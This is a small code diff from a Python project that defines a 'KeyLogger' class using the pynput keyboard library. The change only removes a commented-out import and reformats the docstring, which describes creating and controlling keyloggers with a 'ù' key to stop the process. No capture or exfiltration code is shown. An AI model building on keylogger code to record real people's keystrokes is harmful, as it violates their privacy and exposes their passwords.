@@ -2,12 +2,12 @@
 import pynput
 from pynput import keyboard
 from datetime import datetime
-#from threading import Timer
 
 
 class KeyLogger:
     def __init__(self):
-        """The builder of the 'KeyLogger' class
+        """
+        The builder of the 'KeyLogger' class
 
         Class for creating keyloggers and controlling them.
         'stopMain' is a boolean which detect the 'ù' and stop the main.py process
